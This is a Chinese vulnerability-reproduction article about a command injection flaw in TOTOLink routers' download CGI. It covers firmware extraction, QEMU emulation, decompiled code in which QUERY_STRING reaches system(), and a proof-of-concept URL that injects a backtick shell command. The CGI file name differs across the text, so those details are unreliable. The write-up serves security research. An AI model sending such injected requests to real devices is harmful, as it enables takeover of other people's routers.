> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/aWi3IaS7-qOy9n7hdFRCaw)

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTzZgiav6umOmHgsWv4Hvh3zhgl0qJvSQKfNNic9ZKCRO7SX82jQiaNSHcw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)![图片](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTQWO33O5iaK0xEwKqKryoZlC9yoDQIKgrmFGSWNL9EQWibxFkEvmZXsSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

漏洞描述
----

TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限

漏洞影响
----

TOTOLink 多个设备

漏洞复现
----

下载路由器固件

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTibN5XhfOU50gzkRxyyPXic4MhfOia75S8aKtjaTeAOqdJ6Lt1ejJoXiczw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

使用binwalk分解固件

![图片](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6RVV2e7Iz0yrD7avmj6jvTSLxKbumapKnXwB4xNyJ9yUdOnBwFfeYLibNldkIxbbOlgKIWmneBZfA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

查看分解出来的文件

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

使用qemu搭建路由器

```
#set network  
sudo brctl addbr virbr2  
sudo ifconfig virbr2 192.168.6.1/24 up  
sudo tunctl -t tap2  
sudo ifconfig tap2 192.168.6.11/24 up  
sudo brctl addif virbr2 tap2  
  
qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1" -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic  

```

创建后在qemu里执行命令启动路由器

```
ifconfig eth0 192.168.6.11 up   
scp -r squashfs-root/ root@192.168.6.11:/root/       
chroot ./squashfs-root/ /bin/sh  
touch /var/run/lighttpd.pid  
./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib  

```

注意 **lighttpd.conf** 文件需要修改 **server.pid-file** 参数

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

启动后访问路由器页面

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们找到需要分析的文件目录 **squashfs-root/web_cste/cgi-bin**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

使用Ghidra分析 cgi文件 **downloadFile.cgi**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们注意到其中的system执行命令

```
pcVar1 = getenv("QUERY_STRING");  
memset(acStack1424,0,0x200);  
memset(acStack912,0,0x200);  
sprintf(acStack1424,"echo QUERY_STRING:%s >/tmp/download",pcVar1);  
system(acStack1424);  

```

其中 getenv 从请求Url中获取参数,传参给pcVar1，再通过下面的sprintf 赋值给 acStack1424 使用 system函数 进行命令执行

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们构造请求包控制 QUERY_STRING 参数来进行恶意命令执行

```
/cgi-bin/downloadFlile.cgi?payload=`ls>../cmd.txt`  

```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

关注公众号
-----

```
下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号  
想要加入交流群的师傅公众号点击交流群找WgpsecBot机器人拉你啦～  

```

 ![](http://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzDjy8pCtpvJKBibCLXQDm14MbdlTqXYESXADHkVpL6f81Z4TVFOGQMjBjgxPpUcYnzahRhibQUdcKzQ/0?wx_fmt=png) ** WgpSec狼组安全团队 ** WgpSec 狼组安全团队由几位热爱网络安全的年轻人一同组成过去的几年内没来得及让团队发生有效且质的变化这一次，为了我们的slogan：打造信息安全乌托邦。前进！ 127篇原创内容   公众号

 ![](http://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4k7oncstuDUYBxrtzOqAW4oGso8T29V66MANjNbTib9AIdfGoxhxNMpEhYWG8x4PxK2Yfwq2j6S0w/0?wx_fmt=png) ** PeiQi文库 ** 乌拉乌拉！ 101篇原创内容   公众号

支持作者
----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

关于文库
----

```
在线文库: http://wiki.peiqi.tech  
Github: https://github.com/PeiQi0/PeiQi-WIKI-Book 
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

文库动态
----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)